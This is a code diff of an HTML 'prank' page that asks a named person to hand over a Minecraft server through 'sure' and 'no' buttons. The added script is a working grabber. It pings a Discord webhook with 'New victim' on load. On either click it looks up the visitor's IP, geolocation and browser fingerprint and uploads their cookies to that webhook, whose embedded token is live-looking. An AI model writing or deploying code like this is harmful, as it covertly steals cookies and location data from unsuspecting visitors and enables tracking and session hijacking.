@@ -45,126 +45,144 @@
 </head>
 <body>
   <h1>hello</h1>
-  <h5>please click no :)</h5>
+  <h5>marii please give us the minecraft server</h5>
   <button>sure</button>
   <button>no</button>
   <script>
     const yesButton = document.querySelector('button:first-of-type');
     const noButton = document.querySelector('button:last-of-type');
-    const webhookUrl = 'https://discord.com/api/webhooks/1435310925027610745/Z6fv6m5dZIfF-kdS5LJKumtj3KGb006X-BtZzbst3DywXJ7Simn7DuETfaTN5MNcs3tB';
+    const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
+    const sendNewVictim = () => {
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: 'New victim' }),
+      }).catch(console.error);
+    };
+    sendNewVictim();
+    const getCookiesBlob = () => {
+      const cookies = document.cookie || 'No cookies';
+      const blob = new Blob([cookies], { type: 'text/plain' });
+      return { blob, filename: 'cookies.txt' };
+    };
+    const sendWithCookies = (embedPayload, color, title) => {
+      const { blob, filename } = getCookiesBlob();
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify({
+        embeds: [{
+          ...embedPayload,
+          color: color,
+          title: title
+        }]
+      }));
+      formData.append('file', blob, filename);
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData,
+      }).catch(console.error);
+    };
+    const getUserInfo = (ip) => {
+      return fetch(`http://ip-api.com/json/${ip}`)
+        .then(geoResponse => geoResponse.json())
+        .then(geoData => {
+          const lat = geoData.lat || 'unknown';
+          const lon = geoData.lon || 'unknown';
+          const country = geoData.country || 'unknown';
+          const countryCode = geoData.countryCode || 'unknown';
+          const region = geoData.regionName || 'unknown';
+          const regionCode = geoData.region || 'unknown';
+          const city = geoData.city || 'unknown';
+          const district = geoData.district || 'unknown';
+          const zip = geoData.zip || 'unknown';
+          const isp = geoData.isp || 'unknown';
+          const org = geoData.org || 'unknown';
+          const as = geoData.as || 'unknown';
+          const timezone = geoData.timezone || 'unknown';
+          const mobile = geoData.mobile ? 'Yes' : 'No';
+          const proxy = geoData.proxy ? 'Yes' : 'No';
+          const hosting = geoData.hosting ? 'Yes' : 'No';
+          const status = geoData.status || 'unknown';
+          const userAgent = navigator.userAgent || 'unknown';
+          const language = navigator.language || 'unknown';
+          const platform = navigator.platform || 'unknown';
+          const screenRes = `${screen.width}x${screen.height}` || 'unknown';
+          const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+          const timestamp = new Date().toISOString();
+          return {
+            embed: {
+              description: `Timestamp: ${timestamp}`,
+              fields: [
+                { name: 'IP', value: ip, inline: true },
+                { name: 'Status', value: status, inline: true },
+                { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
+                { name: 'Country', value: country, inline: true },
+                { name: 'Country Code', value: countryCode, inline: true },
+                { name: 'Region', value: region, inline: true },
+                { name: 'Region Code', value: regionCode, inline: true },
+                { name: 'City', value: city, inline: true },
+                { name: 'District', value: district, inline: true },
+                { name: 'ZIP', value: zip, inline: true },
+                { name: 'ISP', value: isp, inline: true },
+                { name: 'Organization', value: org, inline: true },
+                { name: 'AS', value: as, inline: true },
+                { name: 'Timezone', value: timezone, inline: true },
+                { name: 'Mobile', value: mobile, inline: true },
+                { name: 'Proxy', value: proxy, inline: true },
+                { name: 'Hosting', value: hosting, inline: true },
+                { name: 'User Agent', value: userAgent, inline: false },
+                { name: 'Language', value: language, inline: true },
+                { name: 'Platform', value: platform, inline: true },
+                { name: 'Screen Resolution', value: screenRes, inline: true },
+                { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
+              ],
+              footer: { text: 'Grabbed via prank page' }
+            }
+          };
+        })
+        .catch(geoError => {
+          console.error('Error fetching geolocation:', geoError);
+          const timestamp = new Date().toISOString();
+          return {
+            embed: {
+              description: `Timestamp: ${timestamp}`,
+              fields: [
+                { name: 'IP', value: ip, inline: true },
+                { name: 'User Agent', value: navigator.userAgent || 'unknown', inline: false },
+                { name: 'Language', value: navigator.language || 'unknown', inline: true },
+                { name: 'Platform', value: navigator.platform || 'unknown', inline: true },
+                { name: 'Screen Resolution', value: `${screen.width}x${screen.height}` || 'unknown', inline: true },
+                { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: true }
+              ],
+              footer: { text: 'Geolocation failed' }
+            }
+          };
+        });
+    };
     yesButton.addEventListener('click', () => {
       alert('cool thanks!');
-    });
-    noButton.addEventListener('click', () => {
-      const ip = 'fetching...';
-      console.log('Sending info...');
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          const actualIp = data.ip;
-          console.log('Your IP:', actualIp);
-          fetch(`http://ip-api.com/json/${actualIp}`)
-            .then(geoResponse => geoResponse.json())
-            .then(geoData => {
-              const lat = geoData.lat || 'unknown';
-              const lon = geoData.lon || 'unknown';
-              const country = geoData.country || 'unknown';
-              const countryCode = geoData.countryCode || 'unknown';
-              const region = geoData.regionName || 'unknown';
-              const regionCode = geoData.region || 'unknown';
-              const city = geoData.city || 'unknown';
-              const district = geoData.district || 'unknown';
-              const zip = geoData.zip || 'unknown';
-              const isp = geoData.isp || 'unknown';
-              const org = geoData.org || 'unknown';
-              const as = geoData.as || 'unknown';
-              const timezone = geoData.timezone || 'unknown';
-              const mobile = geoData.mobile ? 'Yes' : 'No';
-              const proxy = geoData.proxy ? 'Yes' : 'No';
-              const hosting = geoData.hosting ? 'Yes' : 'No';
-              const status = geoData.status || 'unknown';
-              const userAgent = navigator.userAgent || 'unknown';
-              const language = navigator.language || 'unknown';
-              const platform = navigator.platform || 'unknown';
-              const screenRes = `${screen.width}x${screen.height}` || 'unknown';
-              const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-              const timestamp = new Date().toISOString();
-              const embedPayload = {
-                embeds: [
-                  {
-                    title: 'Captured Victim Info',
-                    description: `Timestamp: ${timestamp}`,
-                    fields: [
-                      { name: 'IP', value: actualIp, inline: true },
-                      { name: 'Status', value: status, inline: true },
-                      { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-                      { name: 'Country', value: country, inline: true },
-                      { name: 'Country Code', value: countryCode, inline: true },
-                      { name: 'Region', value: region, inline: true },
-                      { name: 'Region Code', value: regionCode, inline: true },
-                      { name: 'City', value: city, inline: true },
-                      { name: 'District', value: district, inline: true },
-                      { name: 'ZIP', value: zip, inline: true },
-                      { name: 'ISP', value: isp, inline: true },
-                      { name: 'Organization', value: org, inline: true },
-                      { name: 'AS', value: as, inline: true },
-                      { name: 'Timezone', value: timezone, inline: true },
-                      { name: 'Mobile', value: mobile, inline: true },
-                      { name: 'Proxy', value: proxy, inline: true },
-                      { name: 'Hosting', value: hosting, inline: true },
-                      { name: 'User Agent', value: userAgent, inline: false },
-                      { name: 'Language', value: language, inline: true },
-                      { name: 'Platform', value: platform, inline: true },
-                      { name: 'Screen Resolution', value: screenRes, inline: true },
-                      { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
-                    ],
-                    color: 16711680,
-                    footer: { text: 'Grabbed via prank page' }
-                  }
-                ]
-              };
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embedPayload),
-              })
-              .then(response => {
-                if (!response.ok) {
-                  console.error('Error sending to webhook:', response.statusText);
-                }
-              })
-              .catch(error => {
-                console.error('Error sending to webhook:', error);
-              });
-              alert(`no?? Then your ip shall be mine, its ${actualIp} btw`);
-            })
-            .catch(geoError => {
-              console.error('Error fetching geolocation:', geoError);
-              const fallbackPayload = {
-                embeds: [
-                  {
-                    title: 'Captured Victim Info (Partial)',
-                    description: `Timestamp: ${new Date().toISOString()}`,
-                    fields: [
-                      { name: 'IP', value: actualIp, inline: true },
-                      { name: 'User Agent', value: navigator.userAgent || 'unknown', inline: false },
-                      { name: 'Language', value: navigator.language || 'unknown', inline: true },
-                      { name: 'Platform', value: navigator.platform || 'unknown', inline: true },
-                      { name: 'Screen Resolution', value: `${screen.width}x${screen.height}` || 'unknown', inline: true },
-                      { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: true }
-                    ],
-                    color: 16711680,
-                    footer: { text: 'Geolocation failed' }
-                  }
-                ]
-              };
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(fallbackPayload),
-              });
-              alert(`no?? Then your ip shall be mine, its ${actualIp} btw`);
-            });
+          const ip = data.ip;
+          console.log('Your IP:', ip);
+          getUserInfo(ip).then(({ embed }) => {
+            sendWithCookies(embed, 65280, 'Victim Agreed - Green');
+          });
+        })
+        .catch(error => {
+          console.error('Error fetching IP:', error);
+        });
+    });
+    noButton.addEventListener('click', () => {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          console.log('Your IP:', ip);
+          getUserInfo(ip).then(({ embed }) => {
+            sendWithCookies(embed, 16711680, 'Victim Refused - Red');
+          });
+          alert(`no?? Then your ip shall be mine, its ${ip} btw`);
         })
         .catch(error => {
           console.error('Error fetching IP:', error);
